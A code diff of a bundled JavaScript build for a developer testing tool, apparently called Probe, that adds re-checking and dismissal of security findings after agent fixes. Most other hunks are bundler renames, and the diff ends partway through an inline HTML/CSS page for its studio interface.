+  run.findings.slice(0, 60).forEach((f, n) => lines.push(`  ${run.id}:${n}  [${f.severity}] ${f.check} ${f.title}${f.file ? ` \u2014 ${f.file}${f.line ? `:${f.line}` : ""}` : ""}`));
+  if (run.findings.length > 60) lines.push(`  \u2026 ${run.findings.length - 60} more (probe issues ${run.id})`);
+  if (run.findings.length) lines.push("", `Fix one: probe fix-prompt <issue id> (a prompt to paste) or probe fix <issue id> (an agent). Not an issue here: probe security-dismiss <issue id> "<reason>".`);
+  return lines.join("\n");
+}
+async function recheckFinding(project, finding2) {
+  if (finding2.layer === "static" && finding2.file) {
+    const rules = RULES.filter((r) => r.id === finding2.check && r.files.test(finding2.file));
+    if (!rules.length) return { checked: false, stillFound: false, count: 0, note: `no rule ${finding2.check} for ${finding2.file}` };
+    if (rules.some((r) => r.fileOnly)) {
+      const there = (0, import_node_fs28.existsSync)((0, import_node_path38.join)(project.root, finding2.file));
+      return { checked: true, stillFound: there, count: there ? 1 : 0, note: there ? `${finding2.file} is still in the project` : `${finding2.file} is gone` };
+    }
+    const text2 = readText((0, import_node_path38.join)(project.root, finding2.file));
+    if (text2 === null) return { checked: true, stillFound: false, count: 0, note: `${finding2.file} no longer exists` };
+    const hits = rules.flatMap((r) => matchRule(r, finding2.file, text2, finding2.feature));
+    const same = hits.some((h) => h.fingerprint === finding2.fingerprint);
+    return { checked: true, stillFound: same, count: hits.length, note: same ? `${finding2.check} still matches ${finding2.file}` : hits.length ? `the original match is gone; ${hits.length} other ${finding2.check} match(es) remain in ${finding2.file}` : `${finding2.check} no longer matches ${finding2.file}` };
+  }
+  if (finding2.layer === "deps" && finding2.file) {
+    const { deps } = readDependencies(project.root, [finding2.file]);
+    const [name, version2] = finding2.evidence.split(" ");
+    const still = deps.some((d) => d.name === name && d.version === version2);
+    return { checked: true, stillFound: still, count: still ? 1 : 0, note: still ? `${name} ${version2} is still locked in ${finding2.file} (update the lockfile too)` : `${name} ${version2} is no longer in ${finding2.file}` };
+  }
+  if (finding2.layer === "runtime" && !finding2.check.startsWith("AND-")) {
+    if (!project.config.security.url) return { checked: false, stillFound: false, count: 0, note: "restart the app and run probe security to check it" };
+    const now = await webRuntimeFindings(project.config.security.url, () => {
+    });
+    const still = now.some((f) => f.check === finding2.check && f.title === finding2.title);
+    return { checked: true, stillFound: still, count: still ? 1 : 0, note: still ? "the running app still shows it (restarted after the change?)" : "the running app no longer shows it" };
+  }
+  const why = {
+    history: "a secret in history stays until it is rotated and purged; Probe cannot check that",
+    artifact: "rebuild the app, then run probe security to check what ships",
+    runtime: "reinstall or restart the app, then run probe security",
+    agent: "an agent finding has no rule to re-run: review the change"
+  };
+  return { checked: false, stillFound: false, count: 0, note: why[finding2.layer] ?? "no automatic re-check" };
+}
+function dismissIssue(project, issueId, reason) {
+  const found3 = findIssue(project, issueId);
+  if (!found3?.issue.security) throw new Error(`No security issue ${issueId}.`);
+  return dismiss(project, found3.issue.security, reason);
+}
+
 // src/engine/fix.ts
 function startFix(project, issueId, options = {}) {
-  const found = findIssue(project, issueId);
-  if (!found) throw new Error(`Unknown issue ${issueId}.`);
-  const { issue: issue2, run: source } = found;
+  const found3 = findIssue(project, issueId);
+  if (!found3) throw new Error(`Unknown issue ${issueId}.`);
+  const { issue: issue2, run: source } = found3;
   const run = {
     id: newRunId(),
     kind: "fix",
@@ -22874,6 +24554,10 @@ function startFix(project, issueId, options = {}) {
       run.error = `No change made. Agent: ${run.summary.slice(0, 300)}`;
       return;
     }
+    if (issue2.security) {
+      await recheckSecurity(project, run, log);
+      return;
+    }
     log("\u2500\u2500 unit tests");
     const { run: unit, done } = startUnitRun(project, issue2.feature);
     run.unitRun = unit.id;
@@ -22897,12 +24581,38 @@ function startFix(project, issueId, options = {}) {
     run.status = "passed";
   });
 }
+async function recheckSecurity(project, run, log) {
+  const finding2 = run.issue.security;
+  const feature = findFeature(latestScan(project), finding2.feature);
+  if (feature && feature.stats.testFiles > 0) {
+    log("\u2500\u2500 unit tests");
+    const { run: unit, done } = startUnitRun(project, feature.id);
+    run.unitRun = unit.id;
+    const unitDone = await done;
+    if (unitDone.status !== "passed") {
+      run.status = unitDone.status === "stopped" ? "stopped" : "failed";
+      run.error = `Unit tests after the fix: ${unitDone.status}${unitDone.error ? ` (${unitDone.error})` : ""}.`;
+      return;
+    }
+  }
+  log(`\u2500\u2500 ${finding2.check} again`);
+  const again = await recheckFinding(project, finding2);
+  log(`  ${again.note}`);
+  run.securityRecheck = { stillFound: again.stillFound, note: again.note };
+  if (again.checked && again.stillFound) {
+    run.status = "failed";
+    run.error = `The check still finds it: ${again.note}.`;
+    return;
+  }
+  run.status = "passed";
+}
 function summarizeFix(run) {
   const lines = [`Fix ${run.id} \xB7 ${run.feature} \xB7 ${run.status.toUpperCase()} \xB7 ${run.files.length} files \xB7 $${run.costUsd.toFixed(2)}`, `  issue: ${run.issue.title}`];
   if (run.error) lines.push(run.error);
   for (const f of run.files) lines.push(`  ~ ${f}`);
   if (run.unitRun) lines.push(`  unit run: ${run.unitRun}`);
   if (run.recheckRun) lines.push(`  device recheck: ${run.recheckRun}`);
+  if (run.securityRecheck) lines.push(`  ${run.issue.security?.check ?? "security"} recheck: ${run.securityRecheck.stillFound ? "still found" : "gone"} \u2014 ${run.securityRecheck.note}`);
   if (run.summary) lines.push("", run.summary);
   return lines.join("\n");
 }
@@ -23139,8 +24849,8 @@ var allowsEval = cached2(() => {
     return false;
   }
   try {
-    const F = Function;
-    new F("");
+    const F2 = Function;
+    new F2("");
     return true;
   } catch (_) {
     return false;
@@ -23296,14 +25006,14 @@ var BIGINT_FORMAT_RANGES = {
   int64: [/* @__PURE__ */ BigInt("-9223372036854775808"), /* @__PURE__ */ BigInt("9223372036854775807")],
   uint64: [/* @__PURE__ */ BigInt(0), /* @__PURE__ */ BigInt("18446744073709551615")]
 };
-function pick(schema, mask) {
+function pick(schema, mask2) {
   const newShape = {};
   const currDef = schema._zod.def;
-  for (const key in mask) {
+  for (const key in mask2) {
     if (!(key in currDef.shape)) {
       throw new Error(`Unrecognized key: "${key}"`);
     }
-    if (!mask[key])
+    if (!mask2[key])
       continue;
     newShape[key] = currDef.shape[key];
   }
@@ -23313,14 +25023,14 @@ function pick(schema, mask) {
     checks: []
   });
 }
-function omit(schema, mask) {
+function omit(schema, mask2) {
   const newShape = { ...schema._zod.def.shape };
   const currDef = schema._zod.def;
-  for (const key in mask) {
+  for (const key in mask2) {
     if (!(key in currDef.shape)) {
       throw new Error(`Unrecognized key: "${key}"`);
     }
-    if (!mask[key])
+    if (!mask2[key])
       continue;
     delete newShape[key];
   }
@@ -23359,15 +25069,15 @@ function merge(a, b) {
     // delete existing checks
   });
 }
-function partial(Class2, schema, mask) {
+function partial(Class2, schema, mask2) {
   const oldShape = schema._zod.def.shape;
   const shape = { ...oldShape };
-  if (mask) {
-    for (const key in mask) {
+  if (mask2) {
+    for (const key in mask2) {
       if (!(key in oldShape)) {
         throw new Error(`Unrecognized key: "${key}"`);
       }
-      if (!mask[key])
+      if (!mask2[key])
         continue;
       shape[key] = Class2 ? new Class2({
         type: "optional",
@@ -23388,15 +25098,15 @@ function partial(Class2, schema, mask) {
     checks: []
   });
 }
-function required(Class2, schema, mask) {
+function required(Class2, schema, mask2) {
   const oldShape = schema._zod.def.shape;
   const shape = { ...oldShape };
-  if (mask) {
-    for (const key in mask) {
+  if (mask2) {
+    for (const key in mask2) {
       if (!(key in shape)) {
         throw new Error(`Unrecognized key: "${key}"`);
       }
-      if (!mask[key])
+      if (!mask2[key])
         continue;
       shape[key] = new Class2({
         type: "nonoptional",
@@ -24085,11 +25795,11 @@ var Doc = class {
     }
   }
   compile() {
-    const F = Function;
+    const F2 = Function;
     const args = this?.args;
     const content = this?.content ?? [``];
     const lines = [...content.map((x) => `  ${x}`)];
-    return new F(...args, lines.join("\n"));
+    return new F2(...args, lines.join("\n"));
   }
 };
 
@@ -27290,8 +29000,8 @@ var ZodObject2 = /* @__PURE__ */ $constructor("ZodObject", (inst, def) => {
     return util_exports.extend(inst, incoming);
   };
   inst.merge = (other) => util_exports.merge(inst, other);
-  inst.pick = (mask) => util_exports.pick(inst, mask);
-  inst.omit = (mask) => util_exports.omit(inst, mask);
+  inst.pick = (mask2) => util_exports.pick(inst, mask2);
+  inst.omit = (mask2) => util_exports.omit(inst, mask2);
   inst.partial = (...args) => util_exports.partial(ZodOptional2, inst, args[0]);
   inst.required = (...args) => util_exports.required(ZodNonOptional, inst, args[0]);
 });
@@ -30995,7 +32705,7 @@ var Protocol = class {
           return;
         }
         const pollInterval = task2.pollInterval ?? this._options?.defaultTaskPollInterval ?? 1e3;
-        await new Promise((resolve7) => setTimeout(resolve7, pollInterval));
+        await new Promise((resolve9) => setTimeout(resolve9, pollInterval));
         options?.signal?.throwIfAborted();
       }
     } catch (error2) {
@@ -31012,7 +32722,7 @@ var Protocol = class {
    */
   request(request, resultSchema, options) {
     const { relatedRequestId, resumptionToken, onresumptiontoken, task, relatedTask } = options ?? {};
-    return new Promise((resolve7, reject) => {
+    return new Promise((resolve9, reject) => {
       const earlyReject = (error2) => {
         reject(error2);
       };
@@ -31090,7 +32800,7 @@ var Protocol = class {
           if (!parseResult.success) {
             reject(parseResult.error);
           } else {
-            resolve7(parseResult.data);
+            resolve9(parseResult.data);
           }
         } catch (error2) {
           reject(error2);
@@ -31352,12 +33062,12 @@ var Protocol = class {
       }
     } catch {
     }
-    return new Promise((resolve7, reject) => {
+    return new Promise((resolve9, reject) => {
       if (signal.aborted) {
         reject(new McpError(ErrorCode.InvalidRequest, "Request cancelled"));
         return;
       }
-      const timeoutId = setTimeout(resolve7, interval);
+      const timeoutId = setTimeout(resolve9, interval);
       signal.addEventListener("abort", () => {
         clearTimeout(timeoutId);
         reject(new McpError(ErrorCode.InvalidRequest, "Request cancelled"));
@@ -32497,7 +34207,7 @@ var McpServer = class {
     let task = createTaskResult.task;
     const pollInterval = task.pollInterval ?? 5e3;
     while (task.status !== "completed" && task.status !== "failed" && task.status !== "cancelled") {
-      await new Promise((resolve7) => setTimeout(resolve7, pollInterval));
+      await new Promise((resolve9) => setTimeout(resolve9, pollInterval));
       const updatedTask = await extra.taskStore.getTask(taskId);
       if (!updatedTask) {
         throw new McpError(ErrorCode.InternalError, `Task ${taskId} not found during polling`);
@@ -33161,21 +34871,22 @@ var StdioServerTransport = class {
     this.onclose?.();
   }
   send(message) {
-    return new Promise((resolve7) => {
+    return new Promise((resolve9) => {
       const json = serializeMessage(message);
       if (this._stdout.write(json)) {
-        resolve7();
+        resolve9();
       } else {
-        this._stdout.once("drain", resolve7);
+        this._stdout.once("drain", resolve9);
       }
     });
   }
 };
 
 // src/studio/server.ts
-var import_node_fs29 = require("node:fs");
+var import_node_child_process10 = require("node:child_process");
+var import_node_fs34 = require("node:fs");
 var import_node_http = require("node:http");
-var import_node_path36 = require("node:path");
+var import_node_path44 = require("node:path");
 
 // src/accounts/login.ts
 function prompt3(project, wanted, device, pkg) {
@@ -33236,7 +34947,7 @@ function lastLogin(project) {
 }
 
 // src/cards/explore.ts
-var import_yaml8 = __toESM(require_dist(), 1);
+var import_yaml9 = __toESM(require_dist(), 1);
 var NAVMAP_FILE = "navmap.json";
 function prompt4(project, feature, device, pkg) {
   const cards = listCards(project.root, feature).map((c) => ({ title: c.title, reach: c.reach }));
@@ -33249,7 +34960,7 @@ Only look and navigate: do not post, send, delete or change anything.
 
 ## What Probe already knows about reaching it (feature cards)
 \`\`\`yaml
-${cards.length ? (0, import_yaml8.stringify)(cards) : "none yet\n"}\`\`\`
+${cards.length ? (0, import_yaml9.stringify)(cards) : "none yet\n"}\`\`\`
 
 ## Test accounts
 ${accountsForPrompt(project)}
@@ -33471,9 +35182,9 @@ function summarizeUnitWrite(run) {
 }
 
 // src/engine/verify.ts
-var import_node_path32 = require("node:path");
+var import_node_path39 = require("node:path");
 function featuresOfFiles(project, result, files) {
-  const dirs = result.features.flatMap((f) => f.modules.map((m) => ({ feature: f.id, dir: `${(0, import_node_path32.relative)(project.root, m.dir).replace(/\\/g, "/")}/` }))).sort((a, b) => b.dir.length - a.dir.length);
+  const dirs = result.features.flatMap((f) => f.modules.map((m) => ({ feature: f.id, dir: `${(0, import_node_path39.relative)(project.root, m.dir).replace(/\\/g, "/")}/` }))).sort((a, b) => b.dir.length - a.dir.length);
   const byFeature = /* @__PURE__ */ new Map();
   const unowned = [];
   for (const file of files) {
@@ -33614,9 +35325,9 @@ function summarizeVerify(run) {
 }
 
 // src/tickets/tickets.ts
-var import_node_child_process7 = require("node:child_process");
-var import_node_fs25 = require("node:fs");
-var import_node_path33 = require("node:path");
+var import_node_child_process8 = require("node:child_process");
+var import_node_fs29 = require("node:fs");
+var import_node_path40 = require("node:path");
 function ticketUrl(project, id) {
   return project.config.tickets.url?.replace("{id}", encodeURIComponent(id));
 }
@@ -33628,7 +35339,7 @@ function ticketInfo(project, id) {
   return { id, url: ticketUrl(project, id), commits, features: [...byFeature.keys()], cards: cards.map((c) => `${c.feature}/${c.id}`) };
 }
 function ticketDraft(project, run) {
-  const evidence = (0, import_node_path33.join)(project.store.dir, "runs", run.id);
+  const evidence = (0, import_node_path40.join)(project.store.dir, "runs", run.id);
   const lines = [];
   let title = `[Probe] ${run.feature}: ${run.kind} ${run.status}`;
   switch (run.kind) {
@@ -33674,28 +35385,48 @@ function ticketDraft(project, run) {
 function fileTicket(project, run, draft = ticketDraft(project, run)) {
   const template = project.config.tickets.fileCommand;
   if (!template) throw new Error("No tickets.fileCommand in probe/probe.yaml; copy the draft instead.");
-  const dir = (0, import_node_path33.join)(project.store.dir, "tickets");
-  (0, import_node_fs25.mkdirSync)(dir, { recursive: true });
-  const file = (0, import_node_path33.join)(dir, `${run.id}.md`);
-  (0, import_node_fs25.writeFileSync)(file, draft.body);
+  const dir = (0, import_node_path40.join)(project.store.dir, "tickets");
+  (0, import_node_fs29.mkdirSync)(dir, { recursive: true });
+  const file = (0, import_node_path40.join)(dir, `${run.id}.md`);
+  (0, import_node_fs29.writeFileSync)(file, draft.body);
   const quote = (s) => `"${s.replace(/"/g, "'")}"`;
   const command = template.replace(/\{title\}/g, quote(draft.title)).replace(/\{file\}/g, quote(file));
-  const r = (0, import_node_child_process7.spawnSync)(command, { cwd: project.root, windowsHide: true, shell: isWindows ? "cmd.exe" : "/bin/sh", encoding: "utf8", timeout: 6e4 });
+  const r = (0, import_node_child_process8.spawnSync)(command, { cwd: project.root, windowsHide: true, shell: isWindows ? "cmd.exe" : "/bin/sh", encoding: "utf8", timeout: 6e4 });
   if (r.status !== 0) throw new Error(`Filing failed (${r.status}): ${(r.stderr || r.stdout).trim().slice(0, 500)}`);
   return r.stdout.trim();
 }
 
+// src/studio/projects.ts
+var import_node_fs30 = require("node:fs");
+var import_node_os3 = require("node:os");
+var import_node_path41 = require("node:path");
+function knownProjects() {
+  const dir = (0, import_node_path41.join)((0, import_node_os3.homedir)(), ".probe", "projects");
+  if (!(0, import_node_fs30.existsSync)(dir)) return [];
+  const out = [];
+  for (const entry of (0, import_node_fs30.readdirSync)(dir, { withFileTypes: true })) {
+    if (!entry.isDirectory()) continue;
+    try {
+      const scan2 = JSON.parse((0, import_node_fs30.readFileSync)((0, import_node_path41.join)(dir, entry.name, "scan.json"), "utf8"));
+      if (scan2.project?.root && (0, import_node_fs30.existsSync)(scan2.project.root) && !(0, import_node_path41.resolve)(scan2.project.root).toLowerCase().startsWith((0, import_node_path41.resolve)((0, import_node_os3.tmpdir)()).toLowerCase())) out.push({ root: (0, import_node_path41.resolve)(scan2.project.root), name: scan2.project.name, adapter: scan2.project.adapter, scannedAt: scan2.scannedAt });
+    } catch {
+    }
+  }
+  const seen = /* @__PURE__ */ new Set();
+  return out.filter((p) => !seen.has(p.root.toLowerCase()) && seen.add(p.root.toLowerCase())).sort((a, b) => b.scannedAt.localeCompare(a.scannedAt));
+}
+
 // src/studio/page.html
-var page_default = '<!doctype html>\n<html lang="en">\n<head>\n<meta charset="utf-8">\n<meta name="viewport" content="width=device-width, initial-scale=1">\n<title>Probe Studio</title>\n<style>\n  :root {\n    --bg: #f7f7f5; --panel: #ffffff; --text: #1d1d1b; --muted: #6b6b66; --line: #e4e4df;\n    --accent: #3b5bdb; --ok: #2f9e44; --warn: #e8890c; --fail: #e03131; --track: #ececE7;\n    --mono: ui-monospace, SFMono-Regular, Consolas, monospace;\n  }\n  @media (prefers-color-scheme: dark) {\n    :root {\n      --bg: #141413; --panel: #1d1d1b; --text: #ececE7; --muted: #9a9a93; --line: #2e2e2b;\n      --accent: #748ffc; --ok: #51cf66; --warn: #ffa94d; --fail: #ff6b6b; --track: #2a2a27;\n    }\n  }\n  * { box-sizing: border-box; }\n  body { margin: 0; background: var(--bg); color: var(--text); font: 14px/1.45 system-ui, -apple-system, "Segoe UI", sans-serif; }\n  header { display: flex; align-items: center; gap: 16px; padding: 14px 24px; border-bottom: 1px solid var(--line); background: var(--panel); position: sticky; top: 0; z-index: 2; }\n  header h1 { font-size: 16px; margin: 0; letter-spacing: .2px; }\n  header .meta { color: var(--muted); font-size: 12px; }\n  header .spacer { flex: 1; }\n  nav { display: flex; gap: 4px; }\n  nav button { background: none; border: 0; padding: 6px 12px; border-radius: 6px; color: var(--muted); cursor: pointer; font: inherit; }\n  nav button.active { background: var(--track); color: var(--text); font-weight: 600; }\n  main { padding: 20px 24px; max-width: 1280px; margin: 0 auto; }\n  .btn { background: var(--accent); color: #fff; border: 0; border-radius: 6px; padding: 7px 14px; font: inherit; font-weight: 600; cursor: pointer; }\n  .btn.secondary { background: var(--track); color: var(--text); }\n  .btn:disabled { opacity: .5; cursor: default; }\n  .btn.stop { background: var(--fail); padding: 3px 12px; font-size: 13px; }\n  .toolbar { display: flex; gap: 10px; align-items: center; margin-bottom: 14px; flex-wrap: wrap; }\n  form.acct { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 10px; align-items: end; background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 14px; margin-top: 16px; }\n  form.acct label { display: grid; gap: 4px; font-size: 12px; color: var(--muted); font-weight: 600; }\n  form.acct input { padding: 7px 10px; border: 1px solid var(--line); border-radius: 6px; background: var(--bg); color: var(--text); font: inherit; min-width: 0; }\n  input[type=search] { padding: 7px 10px; border: 1px solid var(--line); border-radius: 6px; background: var(--panel); color: var(--text); font: inherit; min-width: 220px; }\n  .seg { display: inline-flex; border: 1px solid var(--line); border-radius: 6px; overflow: hidden; }\n  .seg button { background: var(--panel); border: 0; padding: 6px 12px; color: var(--muted); cursor: pointer; font: inherit; }\n  .seg button.active { background: var(--track); color: var(--text); font-weight: 600; }\n  .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-bottom: 18px; }\n  .card { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 12px 14px; }\n  .card .k { color: var(--muted); font-size: 12px; }\n  .card .v { font-size: 22px; font-weight: 650; margin-top: 2px; }\n  table { width: 100%; border-collapse: collapse; background: var(--panel); border: 1px solid var(--line); border-radius: 10px; overflow: hidden; }\n  th, td { text-align: left; padding: 8px 12px; border-bottom: 1px solid var(--line); vertical-align: middle; }\n  th { font-size: 12px; color: var(--muted); font-weight: 600; background: var(--panel); }\n  td.num, th.num { text-align: right; font-variant-numeric: tabular-nums; }\n  tbody tr:last-child td { border-bottom: 0; }\n  tr.click { cursor: pointer; }\n  tr.click:hover td { background: var(--track); }\n  .bar { display: flex; height: 8px; width: 140px; border-radius: 4px; overflow: hidden; background: var(--track); }\n  .bar span { display: block; height: 100%; }\n  .pill { display: inline-block; padding: 1px 8px; border-radius: 999px; font-size: 12px; font-weight: 600; }\n  .pill.ok { color: var(--ok); background: color-mix(in srgb, var(--ok) 14%, transparent); }\n  .pill.fail, .pill.failed, .pill.error { color: var(--fail); background: color-mix(in srgb, var(--fail) 14%, transparent); }\n  .pill.warn, .pill.running, .pill.blocked { color: var(--warn); background: color-mix(in srgb, var(--warn) 14%, transparent); }\n  .pill.passed { color: var(--ok); background: color-mix(in srgb, var(--ok) 14%, transparent); }\n  .pill.none, .pill.skipped, .pill.unknown, .pill.stopped { color: var(--muted); background: var(--track); }\n  .pill.h-ok { color: var(--ok); background: color-mix(in srgb, var(--ok) 14%, transparent); }\n  .pill.h-warn { color: var(--warn); background: color-mix(in srgb, var(--warn) 14%, transparent); }\n  .pill.h-fail { color: var(--fail); background: color-mix(in srgb, var(--fail) 14%, transparent); }\n  .pill.h-unknown { color: var(--muted); background: var(--track); }\n  .map { display: grid; grid-template-columns: repeat(auto-fill, minmax(170px, 1fr)); gap: 10px; }\n  .tile { background: var(--panel); border: 1px solid var(--line); border-left: 5px solid var(--track); border-radius: 10px; padding: 10px 12px; cursor: pointer; min-height: 86px; }\n  .tile:hover { background: var(--track); }\n  .tile.h-ok { border-left-color: var(--ok); } .tile.h-warn { border-left-color: var(--warn); } .tile.h-fail { border-left-color: var(--fail); }\n  .tile strong { display: block; margin-bottom: 4px; overflow-wrap: anywhere; }\n  .tile .sig { display: flex; gap: 6px; flex-wrap: wrap; font-size: 11px; color: var(--muted); }\n  .tile .why { font-size: 11px; color: var(--muted); margin-top: 4px; }\n  .box { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 12px 14px; margin-bottom: 14px; }\n  .box h3 { font-size: 13px; margin: 0 0 8px; }\n  .box ul { margin: 4px 0; padding-left: 18px; }\n  form.inline { display: flex; gap: 10px; flex-wrap: wrap; align-items: end; }\n  form.inline label { display: grid; gap: 4px; font-size: 12px; color: var(--muted); font-weight: 600; }\n  form.inline input, form.inline textarea, form.inline select { padding: 7px 10px; border: 1px solid var(--line); border-radius: 6px; background: var(--bg); color: var(--text); font: inherit; }\n  form.inline label.check { display: flex; gap: 6px; align-items: center; font-weight: 400; color: var(--text); font-size: 13px; }\n  textarea { width: 100%; min-height: 90px; resize: vertical; }\n  .muted { color: var(--muted); }\n  .mono { font-family: var(--mono); font-size: 12px; }\n  td.mono { word-break: break-all; }\n  h2 { font-size: 15px; margin: 22px 0 10px; }\n  .back { background: none; border: 0; color: var(--accent); cursor: pointer; font: inherit; padding: 0; margin-bottom: 10px; }\n  pre.log { background: #0f0f0e; color: #d8d8d2; padding: 12px; border-radius: 10px; max-height: 360px; overflow: auto; font: 12px/1.4 var(--mono); white-space: pre-wrap; margin: 0; }\n  .legend { display: flex; gap: 14px; font-size: 12px; color: var(--muted); }\n  .dot { display: inline-block; width: 9px; height: 9px; border-radius: 2px; margin-right: 5px; vertical-align: -1px; }\n  .empty { padding: 30px; text-align: center; color: var(--muted); }\n  .row { display: flex; gap: 12px; align-items: center; }\n  .shots { display: flex; gap: 10px; overflow-x: auto; padding: 6px 0; }\n  .shots figure { margin: 0; flex: 0 0 auto; width: 150px; }\n  .shots img { width: 150px; border-radius: 8px; border: 1px solid var(--line); display: block; }\n  .shots figcaption { font-size: 11px; color: var(--muted); margin-top: 4px; }\n  details.fc { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; margin-bottom: 8px; }\n  details.fc > summary { display: flex; gap: 10px; align-items: center; padding: 10px 14px; cursor: pointer; list-style: none; flex-wrap: wrap; }\n  details.fc > summary::-webkit-details-marker { display: none; }\n  details.fc[open] > summary { border-bottom: 1px solid var(--line); }\n  .fc-body { padding: 4px 16px 14px; }\n  .fc-body .k { color: var(--muted); font-size: 12px; font-weight: 600; margin-top: 10px; }\n  .fc-body ul, .fc-body ol { margin: 4px 0; padding-left: 20px; }\n  .fc-body ul.expect { list-style: none; padding-left: 0; }\n  .fc-body ul.expect li { margin: 3px 0; }\n  .reach { display: flex; flex-wrap: wrap; gap: 6px; align-items: center; margin: 6px 0; }\n  .reach span { background: var(--track); padding: 2px 8px; border-radius: 6px; font-size: 13px; }\n  .reach b { color: var(--muted); font-weight: 400; }\n  .pill.lvl-feature { color: var(--accent); background: color-mix(in srgb, var(--accent) 14%, transparent); }\n  .pill.lvl-capability { color: var(--text); background: var(--track); }\n  .pill.lvl-regression { color: var(--fail); background: color-mix(in srgb, var(--fail) 12%, transparent); }\n  .pill.conf-high, .pill.st-approved { color: var(--ok); background: color-mix(in srgb, var(--ok) 14%, transparent); }\n  .pill.conf-medium, .pill.st-draft { color: var(--warn); background: color-mix(in srgb, var(--warn) 14%, transparent); }\n  .pill.conf-low, .pill.st-rejected { color: var(--fail); background: color-mix(in srgb, var(--fail) 14%, transparent); }\n  .branch { font-size: 12px; padding: 3px 10px; border-radius: 999px; background: var(--track); white-space: nowrap; cursor: default; }\n  .branch.warn { color: var(--warn); background: color-mix(in srgb, var(--warn) 14%, transparent); }\n  .jobs { font: inherit; font-size: 12px; padding: 3px 10px; border: 0; border-radius: 999px; cursor: pointer; white-space: nowrap; color: var(--warn); background: color-mix(in srgb, var(--warn) 14%, transparent); }\n  .jobs[hidden] { display: none; }\n  .banner { background: color-mix(in srgb, var(--fail) 12%, var(--panel)); border-bottom: 1px solid var(--fail); padding: 10px 24px; display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }\n  .banner.warn { background: color-mix(in srgb, var(--warn) 12%, var(--panel)); border-bottom-color: var(--warn); }\n  ul.setup { list-style: none; padding: 0; margin: 0; }\n  ul.setup li { display: flex; gap: 12px; align-items: center; padding: 10px 0; border-bottom: 1px solid var(--line); flex-wrap: wrap; }\n  ul.setup li:last-child { border-bottom: 0; }\n  ul.setup .what { flex: 1; min-width: 200px; }\n  .src { font-size: 11px; color: var(--muted); font-weight: 400; }\n  .split { display: grid; grid-template-columns: 270px minmax(0, 1fr); gap: 16px; align-items: start; }\n  .side { position: sticky; top: 70px; background: var(--panel); border: 1px solid var(--line); border-radius: 10px; max-height: calc(100vh - 90px); display: flex; flex-direction: column; }\n  .side .head { padding: 10px; border-bottom: 1px solid var(--line); display: grid; gap: 8px; }\n  .side .head input { width: 100%; min-width: 0; }\n  .side .chips { display: flex; flex-wrap: wrap; gap: 4px; }\n  .chip { border: 1px solid var(--line); background: var(--panel); color: var(--muted); border-radius: 999px; padding: 2px 10px; font: inherit; font-size: 12px; cursor: pointer; }\n  .chip.active { background: var(--track); color: var(--text); font-weight: 600; }\n  .side ul { list-style: none; margin: 0; padding: 4px; overflow: auto; }\n  .side li { display: flex; gap: 8px; align-items: center; padding: 6px 8px; border-radius: 6px; cursor: pointer; }\n  .side li:hover { background: var(--track); }\n  .side li.active { background: color-mix(in srgb, var(--accent) 14%, transparent); font-weight: 600; }\n  .side li .name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }\n  .side li .n { font-size: 11px; color: var(--muted); font-variant-numeric: tabular-nums; }\n  .side li .d { width: 8px; height: 8px; border-radius: 50%; background: var(--track); flex: 0 0 auto; }\n  .side li .d.fail { background: var(--fail); } .side li .d.draft { background: var(--warn); } .side li .d.ok { background: var(--ok); }\n  .issues { margin: 12px 0; }\n  .issue { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; padding: 8px 0; border-bottom: 1px solid var(--line); }\n  .issue:last-child { border-bottom: 0; }\n  .issue .what { flex: 1; min-width: 220px; }\n  .issue .k { font-size: 11px; }\n  textarea.prompt { font: 12px/1.4 var(--mono); min-height: 220px; margin-top: 8px; }\n  pre.diff { background: var(--bg); border: 1px solid var(--line); border-radius: 8px; padding: 10px; max-height: 420px; overflow: auto; font: 12px/1.45 var(--mono); margin: 6px 0; white-space: pre-wrap; }\n  pre.diff .add { color: var(--ok); } pre.diff .del { color: var(--fail); } pre.diff .hunk { color: var(--muted); }\n  .glance { font-size: 13px; } .glance ul { margin: 4px 0; padding-left: 18px; } .glance code { font-family: var(--mono); font-size: 12px; background: var(--track); padding: 0 4px; border-radius: 4px; }\n  .box.stale { border-color: var(--warn); }\n  .box a { color: var(--accent); font-weight: 600; }\n  /* Runs: the list on the left, the selected run beside it, each with its own scroll. */\n  .runs-layout { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1.2fr); gap: 16px; align-items: start; }\n  .runs-list .filters { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin-bottom: 10px; }\n  .runs-list .filters select, .runs-list .filters input { font: inherit; font-size: 13px; padding: 4px 8px; border: 1px solid var(--line); border-radius: 8px; background: var(--panel); color: var(--text); }\n  .runs-list .filters input { flex: 1 1 160px; min-width: 0; }\n  .runs-list .count { color: var(--muted); font-size: 12px; margin: 8px 2px; display: flex; justify-content: space-between; align-items: center; gap: 8px; }\n  .runs-list td.res { overflow-wrap: anywhere; }\n  tr.click.sel td { background: color-mix(in srgb, var(--accent) 12%, transparent); }\n  tr.click.sel td:first-child { box-shadow: inset 3px 0 0 var(--accent); }\n  .runs-detail { position: sticky; top: 12px; max-height: calc(100vh - 24px); overflow: auto; background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 12px 16px; }\n  .runs-detail .dhead { display: flex; justify-content: flex-end; gap: 8px; position: sticky; top: -12px; background: var(--panel); padding: 4px 0; z-index: 1; }\n  .runs-detail h2 { font-size: 16px; margin: 0 0 8px; overflow-wrap: anywhere; }\n  .runs-detail .empty { padding: 40px 12px; }\n  @media (max-width: 1100px) {\n    .runs-layout { grid-template-columns: 1fr; }\n    .runs-detail { display: none; }\n    .runs-detail.open { display: block; position: fixed; inset: 0; z-index: 30; max-height: none; border-radius: 0; border: 0; }\n  }\n  @media (max-width: 860px) { .split { grid-template-columns: 1fr; } .side { position: static; max-height: 320px; } }\n  @media (max-width: 720px) {\n    header { flex-wrap: wrap; padding: 12px 16px; }\n    main { padding: 16px; }\n    .hide-sm { display: none; }\n    table { font-size: 13px; }\n  }\n</style>\n</head>\n<body>\n<header>\n  <h1>Probe</h1>\n  <div class="meta" id="meta">loading\u2026</div>\n  <span class="branch" 